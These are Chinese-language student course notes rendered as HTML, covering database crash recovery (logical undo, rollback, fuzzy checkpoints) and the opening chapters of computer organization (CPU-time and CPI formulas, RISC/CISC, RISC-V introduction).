<p class="admonition-title">缓冲区实现</p>
<p>数据库缓冲区可以通过以下两种方式实现：</p>
<ul>
<li>在为数据库保留的真实主存区域中实现。</li>
<li>在虚拟内存中实现。</li>
</ul>
<p>在为数据库保留的主存中实现缓冲区有以下缺点：</p>
<ul>
<li>内存在预先分配时被划分为数据库缓冲区和应用程序，限制了灵活性。</li>
<li>需求可能会发生变化，尽管操作系统最了解如何在任何时候划分内存，但它无法改变内存的分区。</li>
</ul>
<p>因此，使用虚拟内存实现数据库缓冲区可以提供更大的灵活性，因为操作系统可以动态管理内存的分配和使用。</p>
<p>尽管存在一些缺点，数据库缓冲区通常在虚拟内存中实现：</p>
<ul>
<li>当操作系统需要驱逐一个已被修改的页面时，该页面会被写入磁盘上的交换空间。</li>
<li>当数据库决定将缓冲区页面写入磁盘时，缓冲区页面可能在交换空间中，可能需要从磁盘上的交换空间读取并输出到数据库，导致额外的I/O操作！</li>
<li>这种情况被称为双重分页问题。</li>
</ul>
<p>理想情况下，当操作系统需要从缓冲区驱逐一个页面时，它应该将控制权交给数据库，数据库应：</p>
<ul>
<li>如果页面被修改过，先将页面输出到数据库（确保先输出日志记录），而不是输出到交换空间。</li>
<li>从缓冲区释放该页面，以供操作系统使用。</li>
</ul>
<p>这样可以避免双重分页，但常见的操作系统不支持这种功能。</p>
</div>
<h2 id="note-db-recovery-failure-with-loss-of-nonvolatile-storage">Failure with Loss of Nonvolatile Storage<a class="headerlink" href="#note-db-recovery-failure-with-loss-of-nonvolatile-storage" title="Permanent link">&para;</a></h2>
<p>在之前的讨论中，我们假设非易失性存储没有丢失。然而，为了应对非易失性存储的丢失，可以使用类似于检查点的技术。</p>
<p>这种技术要求定期将整个数据库内容转储到稳定存储中。在转储过程中，不允许有事务处于活动状态；因此，必须执行类似于检查点的过程。</p>
<p>具体步骤如下：</p>
<ol>
<li>将当前驻留在主存中的所有日志记录输出到稳定存储。</li>
<li>将所有缓冲区块输出到磁盘。</li>
<li>将数据库的内容复制到稳定存储。</li>
<li>在稳定存储的日志中输出一条记录<dump>。</li>
</ol>
<p>通过这些步骤，可以确保即使在非易失性存储丢失的情况下，数据库的内容也能够被恢复。</p>
<h2 id="note-db-recovery-disk-failure-recovery">Disk Failure Recovery<a class="headerlink" href="#note-db-recovery-disk-failure-recovery" title="Permanent link">&para;</a></h2>
<p>为了从磁盘故障中恢复，可以从最近的转储中恢复数据库。然后，查阅日志并重做所有在转储后提交的事务。</p>
<p>这种方法可以扩展以允许在转储期间事务处于活动状态，称为模糊转储或在线转储。</p>
<p>在各种商业数据库管理系统中，使用了许多安全性和可靠性方法。商业数据库产品中有多种工具可用于帮助进行副本和恢复。</p>
<h2 id="note-db-recovery-advanced-recovery-techniques">Advanced Recovery Techniques<a class="headerlink" href="#note-db-recovery-advanced-recovery-techniques" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">物理日志和逻辑日志</p>
<p>物理日志：准确记录了数据库的物理状态变化，即值的变化。例如<code>&lt;Ti, X, V1, V2&gt;</code>，表示事务Ti对数据项X的值从V1更新为V2。</p>
<p>逻辑日志：记录了事务的逻辑操作，而不是具体的值。例如<code>&lt;Ti, Oj, operation-begin,U&gt;</code>，表示事务Ti开始执行操作Oj，U是操作Oj的撤销信息。例如某个操作的物理日志为<code>&lt;Ti, A, 600, 500&gt;</code>，则其逻辑日志为<code>&lt;Ti, A, operation-begin,U&gt;</code>，其中U为<code>&lt;A+100&gt;</code>。</p>
</div>
<p>在高并发环境中，支持锁定技术是至关重要的，尤其是在处理B+-树的并发控制时。B+-树的插入和删除操作通常会提前释放锁。这些操作不能通过恢复旧值（物理撤销）来撤销，因为一旦锁被释放，其他事务可能已经更新了B+-树。</p>
<p>相反，插入（或删除）操作的撤销是通过执行删除（或插入）操作来实现的，这被称为逻辑撤销。对于这样的操作，撤销日志记录应包含要执行的撤销操作，这被称为逻辑撤销日志记录，与物理撤销日志记录相对。</p>
<p>即使对于这样的操作，重做信息也是以物理方式记录的（即每次写入的新值）。逻辑重做非常复杂，因为磁盘上的数据库状态可能不是“操作一致”的。</p>
<p>操作日志记录如下：</p>
<ul>
<li>当操作开始时，记录日志 <Ti, Oj, operation-begin>。其中 Oj 是操作实例的唯一标识符。</li>
<li>当操作正在执行时，记录包含物理重做和物理撤销信息的普通日志记录。</li>
<li>当操作完成时，记录日志 <Ti, Oj, operation-end, U>，其中 U 包含执行逻辑撤销所需的信息。</li>
</ul>
<p>如果在操作完成之前发生崩溃/回滚：</p>
<ul>
<li>找不到 operation-end 日志记录，</li>
<li>使用物理撤销信息来撤销操作。</li>
</ul>
<p>如果在操作完成之后发生崩溃/回滚：</p>
<ul>
<li>找到 operation-end 日志记录，在这种情况下，</li>
<li>使用 U 执行逻辑撤销；忽略操作的物理撤销信息。</li>
</ul>
<p>操作的重做（崩溃后）仍然使用物理重做信息。</p>
<div class="admonition note">
<p class="admonition-title">transaction 和 operation的区别</p>
<p>在数据库系统中，transaction（事务）和operation（操作）是两个不同的概念：</p>
<ul>
<li>
<p><strong>Transaction（事务）</strong>: </p>
<ul>
<li>事务是一个逻辑上的工作单元，由一组操作组成，这些操作要么全部成功，要么全部失败。事务具有ACID特性，即原子性（Atomicity）、一致性（Consistency）、隔离性（Isolation）和持久性（Durability）。</li>
<li>事务的主要目的是确保数据库从一个一致性状态转换到另一个一致性状态，即使在系统故障的情况下，也能通过回滚或重做来保持数据的一致性。</li>
</ul>
</li>
<li>
<p><strong>Operation（操作）</strong>:</p>
<ul>
<li>操作是事务中的基本组成部分，通常指对数据库的单个读或写动作。例如，插入、更新、删除或查询都是操作。</li>
<li>操作是事务执行的具体步骤，多个操作组合在一起形成一个完整的事务。</li>
</ul>
</li>
</ul>
<p>简而言之，事务是由多个操作组成的一个完整的逻辑单元，而操作是事务中的具体执行步骤。</p>
</div>
<div class="admonition key-point">
<p class="admonition-title">rollback a transaction</p>
<p>回滚事务 Ti 的过程如下：</p>
<ol>
<li>反向扫描日志</li>
<li>如果找到日志记录 <code>&lt;Ti, X, V1, V2&gt;</code>，执行撤销操作，并记录一个特殊的仅重做日志记录 <code>&lt;Ti, X, V1&gt;</code>。</li>
<li>如果找到 <code>&lt;Ti, Oj, operation-end, U&gt;</code> 记录：<ul>
<li>使用撤销信息 U 逻辑地回滚操作。</li>
<li>回滚期间执行的更新与正常操作执行时一样被记录。</li>
<li>在操作回滚结束时，不记录 operation-end 记录，而是生成一条记录 <code>&lt;Ti, Oj, operation-abort&gt;</code>。</li>
</ul>
</li>
<li>a 如果找到仅重做记录，忽略它。</li>
<li>b 如果找到 <code>&lt;Ti, Oj, operation-abort&gt;</code> 记录：<ul>
<li>跳过 Ti 的所有前面的日志记录，直到找到记录 <code>&lt;Ti, Oj, operation-begin&gt;</code>。</li>
</ul>
</li>
<li>当找到记录 <code>&lt;Ti, start&gt;</code> 时停止扫描。</li>
<li>在日志中添加一条 <code>&lt;Ti, abort&gt;</code> 记录。</li>
</ol>
<div class="admonition note">
<p class="admonition-title">注意事项</p>
<p>上述情况a和情况b只有在数据库在回滚事务时崩溃时才会发生。
如情况b中所述，跳过日志记录对于防止同一操作的多次回滚是至关重要的。</p>
</div>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-html highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-db-recovery-__codelineno-3-1"></a><span class="p">&lt;</span><span class="nt">T0</span> <span class="na">start</span><span class="p">&gt;</span> 
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-db-recovery-__codelineno-3-2"></a><span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">B</span><span class="err">,</span> <span class="na">2000</span><span class="err">,</span> <span class="na">2050</span><span class="p">&gt;</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-db-recovery-__codelineno-3-3"></a><span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">O1</span><span class="err">,</span> <span class="na">operation-begin</span><span class="p">&gt;</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-db-recovery-__codelineno-3-4"></a><span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">C</span><span class="err">,</span> <span class="na">700</span><span class="err">,</span> <span class="na">600</span><span class="p">&gt;</span> #如果在这里abort，就是进行物理层面的undo
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-db-recovery-__codelineno-3-5"></a><span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">O1</span><span class="err">,</span> <span class="na">operation-end</span><span class="err">,</span> <span class="err">(</span><span class="na">C</span><span class="err">,</span> <span class="err">+</span><span class="na">100</span><span class="err">)</span><span class="p">&gt;</span> # operation-end记录，如果abort，则进行逻辑层面的undo
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-db-recovery-__codelineno-3-6"></a><span class="p">&lt;</span><span class="nt">T1</span> <span class="na">start</span><span class="p">&gt;</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#note-db-recovery-__codelineno-3-7"></a><span class="p">&lt;</span><span class="nt">T1</span><span class="err">,</span> <span class="na">O2</span><span class="err">,</span> <span class="na">operation-begin</span><span class="p">&gt;</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#note-db-recovery-__codelineno-3-8"></a><span class="p">&lt;</span><span class="nt">T1</span><span class="err">,</span> <span class="na">C</span><span class="err">,</span> <span class="na">600</span><span class="err">,</span> <span class="na">400</span><span class="p">&gt;</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#note-db-recovery-__codelineno-3-9"></a><span class="p">&lt;</span><span class="nt">T1</span><span class="err">,</span> <span class="na">O2</span><span class="err">,</span> <span class="na">operation-end</span><span class="err">,</span> <span class="err">(</span><span class="na">C</span><span class="err">,</span> <span class="err">+</span><span class="na">200</span><span class="err">)</span><span class="p">&gt;</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#note-db-recovery-__codelineno-3-10"></a>#假设在这里，T0打算要abort，那么根据上面的规则，从后往前扫描；首先，遇到了 <span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">O1</span><span class="err">,</span> <span class="na">operation-end</span><span class="err">,</span> <span class="err">(</span><span class="na">C</span><span class="err">,</span> <span class="err">+</span><span class="na">100</span><span class="err">)</span><span class="p">&gt;</span> 记录
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#note-db-recovery-__codelineno-3-11"></a><span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">C</span><span class="err">,</span> <span class="na">400</span><span class="err">,</span> <span class="na">500</span><span class="p">&gt;</span> #使用U信息，对C进行加100的操作
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#note-db-recovery-__codelineno-3-12"></a><span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">O1</span><span class="err">,</span> <span class="na">operation-abort</span><span class="p">&gt;</span> #记录abort信息
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#note-db-recovery-__codelineno-3-13"></a><span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">B</span><span class="err">,</span> <span class="na">2000</span><span class="p">&gt;</span> # 遇到了    <span class="p">&lt;</span><span class="nt">T0</span><span class="err">,</span> <span class="na">B</span><span class="err">,</span> <span class="na">2000</span><span class="err">,</span> <span class="na">2050</span><span class="p">&gt;</span>，恢复并记录仅重做信息
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#note-db-recovery-__codelineno-3-14"></a><span class="p">&lt;</span><span class="nt">T0</span> <span class="na">abort</span><span class="p">&gt;</span>  # 遇到 <span class="p">&lt;</span><span class="nt">T0</span> <span class="na">start</span><span class="p">&gt;</span> 记录，结束回滚
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#note-db-recovery-__codelineno-3-15"></a><span class="p">&lt;</span><span class="nt">T1</span> <span class="na">commit</span><span class="p">&gt;</span>
</span></code></pre></div>
</div>
<h3 id="note-db-recovery-when-recovering-from-system-crash">When recovering from system crash<a class="headerlink" href="#note-db-recovery-when-recovering-from-system-crash" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p><strong>从最近的 <code>&lt;checkpoint L&gt;</code> 日志记录开始，向前扫描日志：</strong></p>
<ul>
<li>确保自上次检查点以来的所有更新都被考虑。</li>
</ul>
</li>
<li>
<p><strong>重做所有更新（重演历史）：</strong></p>
<ul>
<li>物理上重做检查点之后所有事务的所有更新操作。</li>
<li>这样可以将数据库恢复到崩溃时的状态，包括已提交和未提交事务的所有更改。</li>
</ul>
</li>
<li>
<p><strong>在扫描过程中维护 undo-list：</strong></p>
<ul>
<li>初始化 <code>undo-list</code> 为检查点记录中的事务集合 <code>L</code>。</li>
<li>每遇到 <code>&lt;Ti start&gt;</code> 日志记录，就将 <code>Ti</code> 加入 <code>undo-list</code>。</li>
<li>每遇到 <code>&lt;Ti commit&gt;</code> 或 <code>&lt;Ti abort&gt;</code> 日志记录，就将 <code>Ti</code> 从 <code>undo-list</code> 中移除。</li>
</ul>
</li>
<li>
<p><strong>完成上述步骤后：</strong></p>
<ul>
<li>逆向扫描日志，对 <code>undo-list</code> 中的事务执行撤销操作。</li>
<li>按照之前描述的方式回滚事务。</li>
<li>当在 <code>undo-list</code> 中的事务 Ti 找到 <code>&lt;Ti start&gt;</code> 记录时，写入 <code>&lt;Ti abort&gt;</code> 日志记录。</li>
<li>当所有 <code>undo-list</code> 中的事务 Ti 找到 <code>&lt;Ti start&gt;</code> 记录时，停止扫描。</li>
<li>这将撤销未完成事务（即没有提交或中止日志记录的事务）的影响。恢复过程现在完成。</li>
</ul>
</li>
</ol>
<figure>
    <img alt="模糊检查点" src="../NOTE/DB/img/recovery_logical_undo.png" width="500" />
    <figcaption>Failure Recovery with Logical Undo</figcaption>
</figure>
<h3 id="note-db-recovery-checkpointing">Checkpointing<a class="headerlink" href="#note-db-recovery-checkpointing" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>标准检查点：</strong></p>
<ul>
<li>将内存中的所有日志记录输出到稳定存储。</li>
<li>将所有修改过的缓冲区块输出到磁盘。</li>
<li>在稳定存储的日志中输出一条 <code>&lt;checkpoint L&gt;</code> 记录。</li>
<li>在检查点进行期间，不允许事务执行任何操作。</li>
</ul>
</li>
<li>
<p><strong>模糊检查点：</strong> 允许事务在检查点的最耗时部分进行时继续进行。</p>
</li>
</ul>
<p>模糊检查点的执行步骤如下：</p>
<ol>
<li>暂时停止所有事务的更新操作。</li>
<li>写入一条 <code>&lt;checkpoint L&gt;</code> 日志记录，并将日志强制写入稳定存储。</li>
<li>记录已修改的缓冲区块列表 <code>M</code>。</li>
<li>允许事务继续进行其操作。</li>
<li>将列表 <code>M</code> 中的所有已修改缓冲区块输出到磁盘。<ul>
<li>在输出过程中，块不应被更新。</li>
<li>遵循 WAL 原则：所有与块相关的日志记录必须在块输出之前被输出。</li>
</ul>
</li>
<li>
<p>在磁盘的固定位置 <code>last_checkpoint</code> 存储指向检查点记录的指针。</p>
</li>
<li>
<p>使用模糊检查点进行恢复时，从 <code>last_checkpoint</code> 指向的检查点记录开始扫描。在 <code>last_checkpoint</code> 之前的日志记录，其更新已反映在磁盘上的数据库中，无需重做。不完整的检查点（即系统在执行检查点时崩溃）也能被安全处理。</p>
</li>
</ol>
<h2 id="note-db-recovery-aries-recovery-algorithm">ARIES Recovery Algorithm<a class="headerlink" href="#note-db-recovery-aries-recovery-algorithm" title="Permanent link">&para;</a></h2>
<h2 id="note-db-recovery-remote-backup-systems">Remote Backup Systems<a class="headerlink" href="#note-db-recovery-remote-backup-systems" title="Permanent link">&para;</a></h2></section></section>
                    <section class='print-page md-section' id='section-2-2-2' heading-number='2.2.2'>
                        <h1>计算机组成与设计<a class='headerlink' href='#section-2-2-2' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-co" heading-number="2.2.2.1"><h1 id="note-co-_1">计算机组成与设计<a class="headerlink" href="#note-co-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 38 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<p>呃啊，硬件<img alt="😇" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f607.svg" title=":innocent:" /></p>
<div class="toc-container">
    <div class="toc-header">目录</div>
    <ul class="toc">
        <li><a href="#note-co-wk1">绪论</a></li>
        <li><a href="#note-co-wk3">指令集</a></li>
        <li><a href="#note-co-wk2">计算机中的算数</a></li>
        <li><a href="#note-co-wk4">处理器</a></li>
        <li><a href="#note-co-wk5">内存层次</a></li>
        <li><a href="#note-co-wk6">存储和IO</a></li>
    </ul>
</div></section><section class="print-page" id="note-co-wk1" heading-number="2.2.2.2"><h1 id="note-co-wk1-note-co-wk1">绪论</h1><div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 741 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 3 分钟</p>
</div>
<h2 id="note-co-wk1-_1">计算机系统结构的八大伟大定律<a class="headerlink" href="#note-co-wk1-_1" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p><strong>Moore's Law</strong> The integrate circuit resource double every 18-24 months.</p>
</li>
<li>
<p>Lower-level details are hidden to higher levels</p>
</li>
<li>
<p>Make the common cases fast</p>
</li>
<li>
<p>Performance via Parallelism</p>
</li>
<li>
<p>Performance via Pipelining</p>
</li>
<li>
<p>Performance via Prediction</p>
</li>
<li>
<p>Hierarchy of memory</p>
</li>
<li>
<p>Dependability via redundancy</p>
</li>
</ul>
<h2 id="note-co-wk1-_2">常见名词和计算<a class="headerlink" href="#note-co-wk1-_2" title="Permanent link">&para;</a></h2>
<p>CPU时钟周期 ：一个是时钟脉冲所需要的时间，也叫节拍脉冲或T周期，它是CPU中最小的时间单位
主频(CPU时钟频率)：1秒中的时钟脉冲数，即时钟周期的倒数</p>
<p>CPI：执行一条指令所需要的时钟周期数 = 总时钟周期数/IC，一般与编译器有关；</p>
<p>IC：总指令数</p>
<p>CPU执行时间：运行一个程序所花费的时间 = CPU时钟周期数/主频 = (指令条数*CPI)/主频</p>
<div class="arithmatex">\[
\begin{align*} 
CPU\ Time &amp;= CPU\ Clock\ Cycles \times Clock\ Cycle\ Time \\
&amp;=\dfrac{ CPU\ Clock\ Cycles}{Clock\ Rates}
\end{align*}
\]</div>
<div class="arithmatex">\[
\begin{align*}
Clock\ Cycles &amp;= Instruction\ Count \times Cycles\ per\ Instruction(CPI)\\
CPU\ Time &amp; = Instruction\ Count \times CPI\times CPI\ Cycle\ Time\\
&amp; = \dfrac{Instruction\ Count \times CPI}{Clock\ Rate}
\end{align*}
\]</div>
<p>影响CPU time 的因素有很多</p>
<div class="arithmatex">\[CPU\ Time = \dfrac{Instructions}{Program}\times \dfrac{Clock\ Cycles}{Instruction}\times \dfrac{Seconds}{Clock Cycle}\]</div>
<p>值得注意的是，若给出测试程序包含多条指令，则CPI就是这几条指令的数学期望</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<table>
<thead>
<tr>
<th>指令类型</th>
<th>所占比例</th>
<th>CPI</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>50%</td>
<td>2</td>
</tr>
<tr>
<td>B</td>
<td>20%</td>
<td>3</td>
</tr>
<tr>
<td>C</td>
<td>10%</td>
<td>4</td>
</tr>
<tr>
<td>D</td>
<td>20%</td>
<td>5</td>
</tr>
</tbody>
</table>
<div class="arithmatex">\[
CPI = 2  \times 0.5 + 3 \times 0.2 + 4 \times 0.1 + 5 \times 0.2 = 3
\]</div>
</div>
<p>MIPS：每秒执行多少百万条指令 = 指令条数/(执行时间x106) = 主频/CPI</p>
<p>ISA:指令集合架构(Instruction Set Architecture)</p>
<p>定义了计算机硬件与软件之间的接口。它具体包括：</p>
<ul>
<li>支持的指令类型（数据处理、控制、输入/输出等）</li>
<li>数据类型（整数、浮点数、字符等）</li>
<li>寄存器设计（寄存器数量和类型）</li>
<li>地址模式（如何计算指令操作数的地址）</li>
</ul>
<p><strong>RISC</strong></p>
<p>RISC（Reduced Instruction Set Computing）是一种指令集设计理念</p>
<ul>
<li>指令数量较少，且所有指令都在单个时钟周期内执行。</li>
<li>每条指令长度相同，通常为固定大小。</li>
<li>使用大量的寄存器以减少内存访问。</li>
<li>简化的寻址模式，提高了执行效率。</li>
<li>硬件设计更简单，易于流水线操作，提高了性能。</li>
</ul>
<p><strong>MISC</strong></p>
<p>MISC（Minimal Instruction Set Computing）是一种极简指令集设计</p>
<ul>
<li>指令集非常小，通常只有几条基本指令。</li>
<li>每条指令可能需要多个周期才能执行。</li>
<li>多数指令依赖于程序的所有操作通过少量基本指令组合完成。</li>
<li>硬件实现简单，小型设备或特定应用中常见。</li>
</ul>
<p><strong>CISC</strong></p>
<p>CISC（Complex Instruction Set Computing）是另一种指令集设计理念</p>
<ul>
<li>包含大量指令，且每条指令可以执行复杂的操作。</li>
<li>指令长度不固定，许多指令可以通过一条指令进行多步操作。</li>
<li>支持更多的寻址模式和数据类型。</li>
<li>可以减少程序的大小，因为许多操作可以通过单条指令完成。</li>
</ul></section><section class="print-page" id="note-co-wk3" heading-number="2.2.2.3"><h1 id="note-co-wk3-instructions-language-of-the-computer">Instructions: Language of the Computer<a class="headerlink" href="#note-co-wk3-instructions-language-of-the-computer" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2974 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 12 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 3 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 10 分钟</p>
</div>
<div class="admonition quote">
<p class="admonition-title">Thanks</p>
<p>本节笔记中使用到的RISC-V指令表格样式来自<a href="https://github.com/TonyCrane/note/"><strong>@TonyCrane</strong><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg></span></a> </p>
</div>
<h2 id="note-co-wk3-introduction">Introduction<a class="headerlink" href="#note-co-wk3-introduction" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>Language of  the machine</p>
<ul>
<li>Instructions(指令)</li>
<li>Instruction set(指令集)</li>
</ul>
</li>
<li>
<p>Computer Designer  goals</p>
<ul>
<li>Find a language that makes it easy to build hardware and compiler.(简单易用)</li>
<li>Maximize performance(同样的资源性能更好)</li>
<li>Minimize cost &amp; energy (同样的性能成本更低)</li>
<li>Clarity of its application  (易用)</li>
<li>Simplicity:  reduce design time (便于设计)</li>
</ul>
</li>
</ul>
<p><strong>Our chosen instruction set: RISC V</strong></p>
<details class="eg">
<summary>各种指令集的区别</summary>
<p><div align=center><img src="../NOTE/CO/pc/16.png" width="60%"></div></p>
</details>
